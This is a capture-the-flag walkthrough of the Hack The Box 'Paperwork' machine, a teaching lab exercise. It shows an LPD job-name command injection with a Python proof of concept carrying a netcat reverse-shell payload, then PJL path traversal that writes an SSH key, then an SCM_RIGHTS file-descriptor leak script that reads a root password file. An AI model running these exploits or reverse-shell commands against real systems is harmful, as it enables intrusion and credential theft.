# HTB Paperwork

##  Machine Information

| Machine Information |                                   |
| ----------- | --------------------------------- |
| Target      | `paperwork.htb` (`10.129.46.120`) |
| OS          | Ubuntu Linux       |
| Difficulty  | Easy                            |

---

## 1. Reconnaissance

### RustScan 

```bash
rustscan -a 10.129.46.120 -- -sV -sC -oN nmap 
```

```text
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
|_  Archive_Printer is ready and printing.
```
### Hosts Entry

```bash
echo "10.129.46.120 paperwork.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web Enumeration

Browsing to:

```text
http://paperwork.htb/
```

reveals an **Intake Portal**:

```text
# Intake Portal

Maintenance Advisory: Backend spooler PRN-ARCHIVE-01 management
console is currently offline. Manual ingestion remains active
via the legacy gateway.

## System Configuration
| Protocol | Compliance Level: RFC 1179 |
| Target Queue | archive_intake |
| Internal Processor | paperwork-archive-v1.02 |
```

### Information Discovered

- `RFC 1179` → LPD protocol
- Queue name → `archive_intake`
- Internal processor → `paperwork-archive-v1.02`

---

## 3. Initial Access — LPD Command Injection

### 3.1 Source Code Analysis

The vulnerable section of `server.py` is:

```python
def handle_print_job(self, data):
    queue = data[1:].decode().strip()
    if queue not in VALID_QUEUE:
        self.sock.send(b'\x01')
        return

    while True:
        chunk = self.sock.recv(1024)
        if not chunk:
            break

        subcommand = chunk[0]
        self.sock.send(b'\x00')
        parts = chunk[1:].decode(errors='ignore').split()
        if not parts:
            continue

        size = int(parts[0])
        content = b""
        while len(content) < size:
            content += self.sock.recv(size - len(content) + 1)

        decoded_content = content.decode(errors='ignore')

        job_name = "Unknown"
        for line in decoded_content.split('\n'):
            line = line.strip()
            if line.startswith('J'):
                job_name = line[1:]
                break

        print(f"{self.id} Executing archive for: {job_name}")
        subprocess.Popen(
            f"echo 'Archive: {job_name}' >> /tmp/archive.log",
            shell=True
        )
```

### Vulnerability

The `J` line contains the job name, which is extracted without sanitization and inserted directly into a shell command:

```python
subprocess.Popen(..., shell=True)
```

can be used to inject arbitrary commands.

---

### 3.2 PoC

Create an LPD exploit:

```python
#!/usr/bin/env python3

import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = 1515
QUEUE = b"archive_intake\n"

CMD = "busybox nc 10.10.14.135 4444 -e sh"

# Inject a command through the job name
job_name = f"x'; {CMD}; echo '"

content = f"J{job_name}\n".encode()
content += b"some file content\n"

# Connect to the LPD service
s = socket.create_connection((HOST, PORT))

# 1) Send receive-job command (0x02) + queue name
s.sendall(b"\x02" + QUEUE)

assert s.recv(1) == b"\x00", "queue rejected"

# 2) Send data file
s.sendall(
    b"\x02 " +
    str(len(content)).encode() +
    b"\n"
)

s.recv(1)

s.sendall(content)
s.sendall(b"\x00")

s.recv(1)

# 3) Job termination
s.sendall(b"\x00")

print("[+] Payload sent.")

s.close()
```

---

### 3.3 Exploit

Start a listener on the attacking machine:

```bash
nc -lvnp 4444
```

Execute the PoC:

```bash
python3 lpd_poc.py paperwork.htb
```

A reverse shell is received:

```text
Connection received on 10.129.46.120 41994
```

Check our privileges:

```bash
id
```

```text
uid=1001(lp) gid=1001(lp) groups=1001(lp)
```

We now have a shell as the `lp` user.

---

## 4. Internal Service Enumeration — JetDirect on Port 9100

### 4.1 Local Port Scan

From the `lp` shell:

```bash
ss -tulnp
```

We discover:

```text
LISTEN 0 4096 127.0.0.1:9100 0.0.0.0:*
```

Port `9100` is commonly associated with **JetDirect / raw printer protocols**, including PJL.

The service is bound only to localhost.

---

### 4.2 Identifying the Service

Then inspect the systemd service:

```bash

cat /etc/systemd/system/jetdirect.service
```

Output:

```ini
[Service]
User=archivist
WorkingDirectory=/home/archivist/printer/
ExecStart=/usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
```

This tells us:

- The service runs as `archivist`.
- Its working directory is `/home/archivist/printer/`.
- It executes `/home/archivist/printer/jetdirect.py`.
- Commands are logged to `/home/archivist/printer/logs/commands.log`.

---

### 4.3 PJL Protocol Interaction

We can communicate with the service using Bash's `/dev/tcp`:

```bash
exec 3<>/dev/tcp/127.0.0.1/9100
echo -e "@PJL INFO ID\r" >&3
timeout 2 cat <&3
exec 3<&-
```

The response is:

```text
HP LASERJET 4ML
```

An important detail is that PJL commands only require a carriage return (`\r`) as the terminator.

---

### 4.4 Writing an SSH Public Key — FSDOWNLOAD

Generate an SSH key pair on the attacking machine:

```bash
ssh-keygen -t ed25519 -f /tmp/k -N ""
cat /tmp/k.pub
```

Example:

```text
ssh-ed25519 AAAAC3Nz~~~~```

Then write our public key:

```bash
KEY='ssh-ed25519 AAAAC3Nz ~~~~'

SIZE=$(( ${#KEY} + 1 ))

echo "Size: $SIZE"

exec 3<>/dev/tcp/127.0.0.1/9100

printf '@PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE=%d\r\n' "$SIZE" >&3

sleep 1

printf '%s\n' "$KEY" >&3

sleep 1

timeout 2 cat <&3

exec 3<&-
```

The service responds:

```text
OK
```

### 4.5 SSH as Archivist

On the attacking machine:

```bash
chmod 600 /tmp/k
ssh -i /tmp/k archivist@paperwork.htb
```

Check our identity:

```bash
id
```

```text
uid=1000(archivist) gid=1000(archivist)
```

We now have an SSH shell as `archivist`.

---

## 5. Privilege Escalation — SCM\_RIGHTS File Descriptor Leak

### 5.1 LinPEAS

Run `linpeas`:

```bash
./linpeas.sh
```

Under **Unix Sockets Analysis**, we find:

```text
/run/paperwork/mgmt.sock
  └─(Read Write )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket
```

The management socket is:

```text
/run/paperwork/mgmt.sock
```

Identify the associated systemd service:

```bash
systemctl status $(systemctl list-units | grep -i paperwork | awk '{print $1}')
```

The service is:

```text
● paperwork.service - Paperwork Management Daemon
     Active: active (running)
   Main PID: 1483 (python3)
   CGroup: /system.slice/paperwork.service
             └─1483 /usr/bin/python3 /usr/bin/paperwork-daemon
```

---

### 5.2 Analyzing the Daemon

Inspect the daemon:

```bash
cat /usr/bin/paperwork-daemon
```

Relevant code:

```python
#!/usr/bin/python3

import socket
import os
import array
import hashlib
import zipfile
import shutil

# Open admin_pins.conf as root during startup
try:
    admin_fd = os.open(
        "/etc/paperwork/admin_pins.conf",
        os.O_RDONLY
    )
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def scan_for_malice():
    """Check whether FSUPLOAD/FSQUERY/FSDOWNLOAD appear in the log."""

    if not os.path.exists(LOG_PATH):
        return False

    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()

        if any(
            trigger in content
            for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]
        ):
            return True

    return False

def trigger_lockdown(conn):
    """Send log_fd and admin_fd through SCM_RIGHTS."""

    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)

        evidence_bundle = array.array(
            "i",
            [log_fd, admin_fd]
        )

        msg = (
            b"ALERT: SECURITY_VIOLATION. "
            b"FORENSIC_CONTEXT_ATTACHED."
        )

        conn.sendmsg(
            [msg],
            [
                (
                    socket.SOL_SOCKET,
                    socket.SCM_RIGHTS,
                    evidence_bundle
                )
            ]
        )

        # Store evidence in root's quarantine directory
        zip_path = "/root/quarantine/evidence.zip"

        with zipfile.ZipFile(
            zip_path,
            'w',
            zipfile.ZIP_DEFLATED
        ) as zipf:
            zipf.write(
                LOG_PATH,
                arcname="commands.log"
            )

        # Truncate the log
        with open(LOG_PATH, 'w') as f:
            f.truncate(0)

        os.close(log_fd)

    except:
        pass

def main():
    socket_path = "/run/paperwork/mgmt.sock"

    # ... socket creation and chmod 660 root:archivist ...

    while True:
        conn, _ = s.accept()

        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()

            token = hashlib.sha256(
                f"SYSTEM_CLEAN:{secret}".encode()
            ).hexdigest()

            conn.sendall(
                f"STATUS: SYSTEM_CLEAN\n"
                f"SIGNATURE: {token}\n"
                .encode()
            )

        conn.close()
```

---

### 5.3 Vulnerability Analysis

There are several issues here:

| #VulnerabilityImpact |                                                           |                                                                        |
| -------------------- | --------------------------------------------------------- | ---------------------------------------------------------------------- |
| 1                    | `admin_fd` remains open after being opened as root        | The privileged file descriptor can later be passed to another process  |
| 2                    | `SCM_RIGHTS` sends file descriptors without authorization | A client can receive a sensitive root-owned file descriptor            |
| 3                    | Authentication is based only on log strings               | `archivist` can influence the log and trigger the privileged code path |

The key concept is that Linux file permissions are checked when `open()` is performed.

Once a privileged process has successfully opened a file, the resulting file descriptor can be used to access that file without performing another pathname permission check.

`SCM_RIGHTS` allows file descriptors to be transferred between processes through Unix-domain sockets.

---

### 5.4 Exploit PoC

Create `/tmp/leak.py`:

```python
import socket
import os
import array

# 1. Add a trigger to the log
with open(
    '/home/archivist/printer/logs/commands.log',
    'a'
) as f:
    f.write('FSUPLOAD\n')
    f.flush()
    os.fsync(f.fileno())

# 2. Connect to the management socket
sock = socket.socket(
    socket.AF_UNIX,
    socket.SOCK_STREAM
)

sock.connect('/run/paperwork/mgmt.sock')
sock.send(b'\n')

# 3. Receive file descriptors
fds = array.array('i')

msg, ancdata, flags, addr = sock.recvmsg(
    1024,
    socket.CMSG_SPACE(16 * fds.itemsize)
)

print('Message:', msg)

# 4. Extract descriptors from SCM_RIGHTS
for cmsg_level, cmsg_type, cmsg_data in ancdata:

    if (
        cmsg_level == socket.SOL_SOCKET
        and cmsg_type == socket.SCM_RIGHTS
    ):
        # Remove padding
        n = len(cmsg_data) - (
            len(cmsg_data) % fds.itemsize
        )

        fds.frombytes(cmsg_data[:n])

        for fd in fds:
            print(f'--- FD {fd} ---')

            print(
                os.pread(fd, 4096, 0)
                .decode(errors='ignore')
            )
```

---

### 5.5 Execute the Exploit

```bash
python3 /tmp/leak.py
```

The response is:

```text
Message: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'

--- FD 3 ---
FSUPLOAD

--- FD 4 ---
ADMIN_PASSWORD=<root_password>
```

The second file descriptor points to:

```text
/etc/paperwork/admin_pins.conf
```

Because the file descriptor was opened by the root-owned daemon, `archivist` can read it despite not having direct permission to open the file by pathname.

We have obtained the root password.

---

### 5.6 Root Access

Switch to root:

```bash
su -
```

Enter the recovered password.

Verify:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Read the root flag:

```bash
cat /home/archivist/user.txt
cat /root/root.txt
```


Root access achieved.
